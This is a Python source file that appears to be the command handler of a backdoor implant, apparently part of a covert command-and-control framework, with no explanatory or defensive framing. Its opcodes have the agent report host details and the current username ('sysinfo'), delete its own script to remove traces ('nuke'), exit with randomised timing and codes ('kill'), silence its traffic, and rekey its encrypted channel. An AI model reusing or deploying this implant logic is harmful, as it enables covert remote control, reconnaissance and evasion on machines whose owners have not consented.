def init( storage ) :
	Commands = {
		'reset' : 'R',
		'identity' : 'ID',
		'sysinfo' : 'SI',
		'kill' : 'KI',
		'mute' : 'MU',
		'unmute' : 'UM',
		'nuke' : 'NK',
		'check_sync' : 'CS',
		'sync' : 'Y',
		'chpasswd' : 'PWD',
	}
	storage['commands'] = Commands
	def wait_exit() :
		import os, random, time
		time.sleep(random.randint(1,5))
		os._exit(random.randint(0,256))
	storage['wait_exit_func'] = wait_exit

	def nuke() :
		import os, sys
		filename = sys.argv[0]
		os.unlink(filename)
	storage['nuke_func'] = nuke

	def dummy_send(raw) : return
	storage['dummy_send_func'] = dummy_send
	storage['real_send_func'] = storage['COMMON']['handler'].send_function

	def chpasswd (passwd) :
		from time import sleep
		sleep(0.1)
		storage['COMMON']['handler'].getOrchestrator().initCrypto(passwd)
	storage['chpasswd_func'] = chpasswd

	return True


def work( storage, message ) :
	# print( "Control message: %s" % message )
	import re
	args = re.split("\s", message)
	message = args[0]

	if message == storage['commands']['reset'] :
		storage['COMMON']['handler'].reset()
		return 'OK'
	elif message == storage['commands']['identity'] :
		return storage['COMMON']['handler'].orchestrator.getIdentity()[:8]

	elif message == storage['commands']['sync'] :
		stream = args[1]
		# print type(args), args
		storage['COMMON']['handler'].getOrchestrator().reset( streams = [stream] )
		# print "Reseted"
		return 'OK'

	elif message == storage['commands']['chpasswd'] :
		new_passwd = args[1]
		import threading
		print storage.keys()
		chpasswd_thread = threading.Thread( target = storage['chpasswd_func'], args = ( new_passwd, ) )
		chpasswd_thread.start()
		return 'OK'


	elif message == storage['commands']['kill'] :
		storage['COMMON']['handler'].stop()
		import threading
		kill_thread = threading.Thread(target = storage['wait_exit_func'])
		kill_thread.start()
		return "OK"

	elif message == storage['commands']['mute'] :
		# if (storage['COMMON']['handler'])		# If it is interrogating,
		storage['COMMON']['handler'].send_function = storage['dummy_send_func']
		return "OK" # just for the hell of it

	elif message == storage['commands']['unmute'] :
		storage['COMMON']['handler'].send_function = storage['real_send_func']
		return "OK" #

	elif message == storage['commands']['nuke'] :
		storage['nuke_func']()
		return "OK" #

	elif message == storage['commands']['check_sync'] :
		import json
		orch = storage['COMMON']['handler'].getOrchestrator()
		ret_dict = {}
		for stream in orch.getStreams() :
			ret_dict[stream] = orch.getKeyCycles(stream)
		ret = json.dumps(ret_dict).replace( " ","" )
		return ret

	elif message == storage['commands']['sysinfo'] :
		import platform, json, getpass, locale
		ret = "+".join([				   # 113 bytes
			platform.node(),
			platform.machine(),
			platform.version(),
			'-'.join(locale.getdefaultlocale()),
			platform.platform(),
			platform.release(),
			platform.system(),
			platform.processor(),
			getpass.getuser(),
			'-'.join(platform.win32_ver()),
			'-'.join(platform.libc_ver()),
			# '-'.join(platform.mac_ver()),
		])
		# ret = json.dumps(info).replace( " ","" )	# to save some bytes
		return ret
	else :
		return "N/A"
